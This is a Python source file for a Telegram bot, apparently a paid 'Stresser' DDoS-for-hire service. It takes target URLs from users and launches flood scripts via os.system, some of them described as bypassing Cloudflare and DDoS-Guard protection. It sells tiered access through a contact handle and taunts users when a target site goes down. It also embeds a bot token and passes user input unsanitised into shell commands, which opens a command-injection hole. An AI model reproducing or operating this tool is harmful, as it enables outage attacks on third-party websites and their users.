import telebot
import os
import time

# Inisialisasi bot dengan token bot Anda
bot = telebot.TeleBot('6510877005:AAGNEVNkQvVcLAE41N0CgZGkG7c_VDBvqKs')

# Daftar pengguna VVIP
vvip_users = [5564352790, 6178083755]

# Variabel status serangan
is_tls_running = False
is_freeflood_running = False    
is_ddg_running = False
is_cfbypass_running = False
is_cf_running = False

# Menangani perintah /addvip
@bot.message_handler(commands=['addvip'])
def handle_addvip(message):
    # Verifikasi kredensial pengguna
    if message.from_user.id == 6178083755:
        # Tambahkan pengguna ke daftar pengguna VVIP
        vvip_users.append(message.from_user.id)
        bot.reply_to(message, "User has been successfully registered to the VVIP list ! Enjoy @fzdvvtrs_bot")
    else:
        bot.reply_to(message, "You are not an owner . Go buy an access stupid @fengzzt")

# Menangani perintah /tls
@bot.message_handler(commands=['tls'])
def handle_tls(message):
    # Verifikasi pengguna VIP
    if message.from_user.id in vvip_users:
        global is_tls_running
        if not is_tls_running:
            msg = bot.send_message(message.chat.id, "Send url of target:")
            bot.register_next_step_handler(msg, perform_tls)
        else:
            bot.reply_to(message, "Tls Attack Sent!!!.")
    else:
        bot.reply_to(message, "You don't have access to this feature. If you want to buy access, please contact @fengzzt.")

# Menjalankan serangan tls
def perform_tls(message):
    global is_tls_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent!!!")
    is_tls_running = True
    os.system("node POWERFUL.js " + url + " 60 95500 p.txt")
    time.sleep(60)  # Tunggu selama 60 detik
    is_tls_running = False
    bot.send_message(message.chat.id, "Attack Stopped Mother Fucker The Website is Down.")

# menangani perintah Yura-VVIP
@bot.message_handler(commands=['yuravvip'])
def handle_yuravvip(message):
    # Verifikasi pengguna VIP
    if message.from_user.id in vvip_users:
        global is_yuravvip_running
        if not is_yuravvip_running:
            msg = bot.send_message(message.chat.id, "Send url of target:")
            bot.register_next_step_handler(msg, perform_yuravvip)
        else:
            bot.reply_to(message, "Yura-vvip Attack Sent!!!.")

def perform_yuravvip(message):
    global is_yuravvip_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent!!!")
    is_yuravvip_running = True
    os.system("go run YURA.go " + url + " GET")
    time.sleep(20)  # Tunggu selama 20 detik
    is_yuravvip_running = False
    bot.send_message(message.chat.id, "Attack Stopped Mother Fucker The Website is Down")

# Menangani perintah /freeflood
@bot.message_handler(commands=['freeflood'])
def handle_freeflood(message):
    global is_freeflood_running
    if not is_freeflood_running:
        msg = bot.send_message(message.chat.id, "Send url of target:")
        bot.register_next_step_handler(msg, perform_freeflood)
    else:
        bot.reply_to(message, "Wait for process.........")

# Menjalankan serangan freeflood
def perform_freeflood(message):
    global is_freeflood_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent!!!")
    is_freeflood_running = True
    os.system("node POWERFUL.js " + url + " 20 15500 p.txt")
    time.sleep(20)  # Tunggu selama 20 detik
    is_freeflood_running = False
    bot.send_message(message.chat.id, "Attack Stopped Mother Fucker The Website is Down")
    
@bot.message_handler(commands=['tlsv2'])
def handle_cfbypass(message):
    # Verifikasi pengguna VVIP
    if message.from_user.id in vvip_users:
        global is_cfbypass_running
        if not is_cfbypass_running:
            msg = bot.send_message(message.chat.id, "Send url of target:")
            bot.register_next_step_handler(msg, perform_cfbypass)
        else:
            bot.reply_to(message, "Wait process.......")
    else:
        bot.reply_to(message, "You don't have access to this feature. If you want to buy access, please contact @fengzzt.")

# Menjalankan serangan DDG
def perform_cfbypass(message):
    global is_cfbypass_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent")
    is_cfbypass_running = True
    os.system("node haha.js " + url + "60 5000")
    time.sleep(60)  # Tunggu selama 60 detik
    is_cfbypass_running = False
    bot.send_message(message.chat.id, "Attack Stopped Mother Fucker The Website is Down.") 
    
@bot.message_handler(commands=['cf'])
def handle_cf(message):
    # Verifikasi pengguna VVIP
    if message.from_user.id in vvip_users:
        global is_cf_running
        if not is_cf_running:
            msg = bot.send_message(message.chat.id, "Send url of target:")
            bot.register_next_step_handler(msg, perform_cf)
        else:
            bot.reply_to(message, "Wait process.......")
    else:
        bot.reply_to(message, "You don't have access to this feature. If you want to buy access, please contact @fengzzt.")

# Menjalankan serangan DDG
def perform_cf(message):
    global is_cf_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent")
    is_cf_running = True
    os.system("node cfb.js " + url + " 60")
    time.sleep(60)  # Tunggu selama 60 detik
    is_cf_running = False
    bot.send_message(message.chat.id, "Attack Stopped Mother Fucker The Website is Down.") 

# Menangani perintah /DDG
@bot.message_handler(commands=['ddg'])
def handle_ddg(message):
    # Verifikasi pengguna VVIP
    if message.from_user.id in vvip_users:
        global is_ddg_running
        if not is_ddg_running:
            msg = bot.send_message(message.chat.id, "Send url of target:")
            bot.register_next_step_handler(msg, perform_ddg)
        else:
            bot.reply_to(message, "Wait process.......")
    else:
        bot.reply_to(message, "You don't have access to this feature. If you want to buy access, please contact @fengzzt.")

# Menjalankan serangan DDG
def perform_ddg(message):
    global is_ddg_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent")
    is_ddg_running = True
    os.system("node DDG_BYPASS.js " + url + " 60 95500 p.txt 512")
    time.sleep(60)  # Tunggu selama 60 detik
    is_ddg_running = False
    bot.send_message(message.chat.id, "Attack Stopped Mother Fucker The Website is Down.")

# Menangani perintah /haha
@bot.message_handler(commands=['yuratls'])
def handle_yuratls(message):
    # Verifikasi pengguna VVIP
    if message.from_user.id in vvip_users:
        global is_yuratls_running
        if not is_yuratls_running:
            msg = bot.send_message(message.chat.id, "Send url of target:")
            bot.register_next_step_handler(msg, perform_yuratls)
        else:
            bot.reply_to(message, "Wait process.......")
    else:
        bot.reply_to(message, "You don't have access to this feature. If you want to buy access, please contact @fengzzt.")

def perform_yuratls(message):
    global is_yuratls_running
    url = message.text
    bot.send_message(message.chat.id, "Attack Sent!!!")
    is_yuratls_running = True
    os.system("node yuratls.js {url} 300 150000 p.txt")
    time.sleep(20)  # Tunggu selama 20 detik
    is_yuravvip_running = False
    bot.send_message(message.chat.id, "Attack Stopped Mother Fucker The Website is Down")
 

# Menangani perintah /stopall
@bot.message_handler(commands=['stopall'])
def handle_stopall(message):
    global is_tls_running, is_freeflood_running, is_ddg_running, is_yuratls_running, is_yuravvip_running
    is_tls_running = False
    is_freeflood_running = False
    is_ddg_running = False
    is_yuratls_running = False
    is_yuravvip_running = False
    os.system("killall node")
    bot.send_message(message.chat.id, "All attacks have been stopped.")

# Menangani pesan teks dari pengguna
@bot.message_handler(commands=['start'])
def handle_message(message):
    if message.from_user.id in vvip_users:
        bot.reply_to(message, "Hello! Welcome to Stresser Bot. You are a not VVIP user.")
    else:
        bot.reply_to(message, "Hello! Welcome to Stresser Bot. Buy VVIP plan at @fengzzt")
        
@bot.message_handler(commands=['author'])
def author (message):
    bot.send_message(message.chat.id, "@fengzzt Don't Spam")
  
@bot.message_handler(commands=['help'])
def help (message):
    bot.send_message(message.chat.id, "/freeflood for noob plan/free\n/tls for tls attack (warning: high power)\n/DDG for VVIP plans\n/yuravvip for the best attack\nNote: Don't attack .gov websites!!!")

# Menjalankan bot
bot.polling()
